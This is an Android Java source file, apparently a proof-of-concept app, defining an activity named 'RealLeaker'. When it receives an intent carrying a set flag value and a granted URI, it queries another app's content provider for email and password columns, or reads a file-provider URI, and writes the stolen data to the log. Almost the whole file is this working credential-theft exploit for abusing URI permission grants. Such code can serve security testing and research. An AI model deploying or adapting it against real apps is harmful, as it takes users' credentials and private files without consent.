package com.mbl.test.paddleactivity;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class RealLeaker extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_real_leaker);
        Intent i = getIntent();
        if (i.getIntExtra("flag", 0) == 1999) {
            Log.d("LOG","Got the intent with flag_read_uri_permission, now we can access content-provider");
            dumpFromCP(i.getData());
        } else if (i.getIntExtra("flag", 0) == 2999) {
            Log.d("LOG","Got the intent with flag_read_uri_permission, now we can access content-provider");
            dumpFromFP(i.getData());
        }
        finish();
    }

    public void dumpFromCP(Uri uri) {
        Uri myUri;
        myUri = uri;
        String[] str = new String[] {"email","password"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(myUri,str,null,null,null);
        Log.i("LOG","Dumping data\n");
        Log.e("LOG", DatabaseUtils.dumpCursorToString(c));
    }

    public void dumpFromFP(Uri uri) {
        try {
            InputStream stream = getContentResolver().openInputStream(uri);
            InputStreamReader reader = new InputStreamReader(stream);
            BufferedReader read = new BufferedReader(reader);
            String str;
            Log.e("LOG","reading line...");
            while ((str = read.readLine()) != null){
                Log.i("READING",str);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}